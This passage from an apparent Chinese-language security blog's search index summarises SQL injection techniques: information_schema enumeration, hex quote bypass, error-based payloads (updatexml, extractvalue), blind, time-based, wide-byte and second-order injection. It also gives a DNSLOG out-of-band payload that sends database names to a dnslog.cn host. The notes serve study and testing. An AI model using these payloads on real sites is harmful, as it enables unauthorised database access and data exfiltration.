class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">schema_name</span> ) <span class="hljs-keyword">from</span> information_shcema.schemata(元数据库得数据库表) 一次性全部显示<br></code></pre></td></tr></table></figure><h6 id="列出对应得数据库得所有表"><a href="#列出对应得数据库得所有表" class="headerlink" title="列出对应得数据库得所有表"></a>列出对应得数据库得所有表</h6><p>limit一个个打印出来字段名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;test&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">select <span class="hljs-built_in">group_concat</span>(table_name)frominformation_schema<span class="hljs-selector-class">.tables</span> where table_schema=<span class="hljs-number">0</span>x674657374 <br><span class="hljs-function"><span class="hljs-title">group_concat</span><span class="hljs-params">()</span></span>一次性弄出来<br></code></pre></td></tr></table></figure><p><strong>注意数据库名可以使用十六进制来替代字符串,这样可以绕过单引号得限制</strong> </p><h6 id="查询特定的表的字段"><a href="#查询特定的表的字段" class="headerlink" title="查询特定的表的字段"></a>查询特定的表的字段</h6><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">COLUMN_NAME</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">COLUMNS</span> <span class="hljs-keyword">where</span> TABLE_SCHEMA=<span class="hljs-string">&#x27;test&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">TABLE_NAME</span>=<span class="hljs-string">&#x27;t10&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h5 id="-2"><a href="#-2" class="headerlink" title></a></h5>]]></content>
    
    
    <categories>
      
      <category>sql总结</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql总结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql各种注入手法</title>
    <link href="/2021/01/23/sql/"/>
    <url>/2021/01/23/sql/</url>
    
    <content type="html"><![CDATA[<h5 id="一-报错注入"><a href="#一-报错注入" class="headerlink" title="一.报错注入"></a>一.报错注入</h5><p>利用前提:页面上没有显示位无所谓,但是需要输出sql语句执行错误信息,比如mysqli_error()</p><p>优点:不需要显示位</p><p>缺点:需要输出mysqli_error()报错信息</p><h5 id="报错函数"><a href="#报错函数" class="headerlink" title="报错函数"></a>报错函数</h5><p><strong>1.Floor() 对于这个报错来说,先group by 之后再select</strong></p><p>group by 执行一次rand ,如果有,直接count(*),如果没有,先插入(相当于执行力两次rand)</p><p>floor函数的作用是返回小于等于该值的最大整数,也可以理解为向下取整,只保留整数部分</p><p>rand(0)函数可以用来生成0,1,但是rand(0)和rand()还是有本质去别的,rand(0)相当于给rand函数传递了一个参数,然后rand()函数会根据0这个参数进行随机数生成.而rand()生成的数字是完全随机的,而rand(0)是有规律的生成,我们可以在数据库中尝试.</p><p>floor()返回小于等于该值的最大整数.</p><p>mt_rand()比rand()获取随机数更快</p><p><strong>2.通过extractvalue报错</strong></p><p>函数解释:</p><p>extractvalue():从目标xml中返回包含所查询的字符串.</p><p>extractvalue(xml_document,XPath_string);</p><p>第一个参数:xml_document是string格式(如果我们不写字符串格式而写一个数字,那么就会报错,将第二个参数后面的语句查询出来.concat(1(只要是不正确的路径就行),….),输入不正确的路径string,会直接报错输出)</p><p>第二个参数:XPAth_String(XPath格式的字符串)</p><p>and extractvaue(1,concat((任意字符),(payload),(任意字符串,可写可不写))</p><p><strong>如果XPath_string不是XPath格式,则会报错并显示出XPath_string的值</strong>,发生错误字符后面的值显示</p><p><strong>3.通过updatexml报错</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">and</span> updatexml(<span class="hljs-number">1</span>,(pyload),<span class="hljs-number">1</span>)<br><br><span class="hljs-attribute">and</span> updatexml(<span class="hljs-number">1</span>,(concatenate(<span class="hljs-number">1</span>,(select user()),<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>4.exp函数报错,有版本限制5.7.26以下才可以用</p><h6 id="二-布尔注入"><a href="#二-布尔注入" class="headerlink" title="二.布尔注入"></a>二.布尔注入</h6><p>利用前提:页面上没有显示位,也没有输出sql语句执行错误信息.</p><p>只能通过页面返回正常不正常</p><p>优点:不需要显示位,不需要出错信息.</p><p>缺点速度慢,耗费大量时间(可写python脚本跑)</p><p><strong>布尔注入函数</strong></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">-- <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id=<span class="hljs-keyword">exists</span>(<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;Dumb&#x27;</span>)<br>-- <span class="hljs-keyword">select</span> ord(<span class="hljs-string">&#x27;a&#x27;</span>)<br>-- <span class="hljs-keyword">select</span> mid(<span class="hljs-string">&#x27;skk&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br>-- <span class="hljs-keyword">select</span> <span class="hljs-built_in">substr</span>(<span class="hljs-string">&#x27;skk&#x27;</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br>-- <span class="hljs-keyword">select</span> <span class="hljs-keyword">left</span>(<span class="hljs-string">&#x27;skk&#x27;</span>,<span class="hljs-number">2</span>)<br>-- <span class="hljs-keyword">select</span> <span class="hljs-keyword">right</span>(<span class="hljs-string">&#x27;skk&#x27;</span>,<span class="hljs-number">2</span>)<br>-- <span class="hljs-keyword">select</span> ASCII(<span class="hljs-string">&#x27;a&#x27;</span>)<br>-- <span class="hljs-keyword">select</span> <span class="hljs-built_in">length</span>(<span class="hljs-string">&#x27;aaa&#x27;</span>)<br>-- <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username regexp (<span class="hljs-string">&#x27;DUmb&#x27;</span>)<br>-- <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username <span class="hljs-keyword">like</span> (<span class="hljs-string">&#x27;DUmb&#x27;</span>)<br></code></pre></td></tr></table></figure><h6 id="三-延时注入"><a href="#三-延时注入" class="headerlink" title="三.延时注入"></a>三.延时注入</h6><p>利用前提:</p><p>页面上没有显示位,也没有输出SQL语句执行错误信息.</p><p>正确的sql语句和错误的sql语句返回页都一样,但是加入sleep(5)条件之后,页面明显加载时间有变化,慢了五秒</p><p>优点: 不需要显示位不需要错误信息</p><p>缺点:很明显速度慢,耗费大量的时间.</p><h6 id="四-宽字节注入"><a href="#四-宽字节注入" class="headerlink" title="四.宽字节注入"></a>四.宽字节注入</h6><p>GB2312,GBK,GB18030,BIG5等这些都是常见的宽字节,实际上为两字节,如果使用了类似于set names gbk这样的语句,此时的mysql数据库就会将ascii大于128(%df)的字符当作是汉字字符的一部分,从而能吃掉,引入单引号或者双引号.</p><h6 id="五-二次注入"><a href="#五-二次注入" class="headerlink" title="五.二次注入"></a>五.二次注入</h6><p>在注册中,注册一个和admin账号相似的admin’#,然后会发现你登陆admin’#的时候,实际上是登录了admin,改密码的时候,改的也是admin.当apache给数据库处理端传送SELECT * FROM users WHERE username&#x3D;’admin\‘#’ and password&#x3D;’$password’的时候,数据库此时会忽视\变成SELECT * FROM users WHERE username&#x3D;’admin’#’ and password&#x3D;’$password’ 后面的那段就被注释掉了</p><p>虽然登录的时候显示admin’#,但是数据库取出来的数据都是admin的</p><p>二次注入的利用条件:</p><p>1.用户向数据库插入恶意语句(即使后端代码对语句进行转义,如mysql_escape_string,mysql_real_escape_string转义)</p><p>2.数据库对直接取出来的恶意数据并没有进行过滤</p><h6 id="六-DNSLOG外带注入"><a href="#六-DNSLOG外带注入" class="headerlink" title="六.DNSLOG外带注入"></a>六.DNSLOG外带注入</h6><p>条件:</p><p>需要load_file(读权限),需要开启security_file_priv为空</p><p>不论是布尔盲注还是时间注入,都需要频繁的跑请求才能获取数据库中的值,在现代的waf防护下,很可能导致ip被封,我们可以结合dnslog完美快速的将数据取出来.如遇到mysql盲注时,可以利用内置函数load_file()来完成dnslog外带注入,load_file不仅能够加载本地文件,同时也能对url发起请求</p><p>网址:<a href="http://www.dnslog.cn/">http://www.dnslog.cn</a></p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">=<span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">and</span> load_file(<span class="hljs-built_in">concat</span>(&#x27;\\\\\\\\&#x27;,(select database()),&#x27;.xxx. dnslog.cn\\\abc&#x27;))--+<br></code></pre></td></tr></table></figure><p>注意像这个dnslog外带,对应于@等特殊字符读不出来,需要加编码变成数字</p><p>尽量用十六进制函数包裹,以防对方数据具有特殊字符</p><p>\1. sql盲注，后端数据库用的mysql数据库，<strong>说一下用dnslog回显只能用于windows系统</strong>，原理就是’\\‘代表Microsoft Windows通用命名约定（UNC）的文件和目录路径格式利用任何以下扩展存储程序引发DNS地址解析。双斜杠表示网络资源路径多加两个\就是转义了反斜杠。</p><p>\2. 通过DNSlog盲注需要用的load_file()函数，所以一般得是root权限。<code>show variables like &#39;%secure%&#39;;</code>查看load_file()可以读取的磁盘。</p><blockquote><p>1、当secure_file_priv为空，就可以读取磁盘的目录。<br>2、当secure_file_priv为C:\，就可以读取G盘的文件。<br>3、当secure_file_priv为null，load_file就不能加载文件。</p></blockquote><p>通过设置my.ini来配置。secure_file_priv&#x3D;””就是可以load_flie任意磁盘的文件。</p>]]></content>
    
    
    <categories>
      
      <category>sql注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
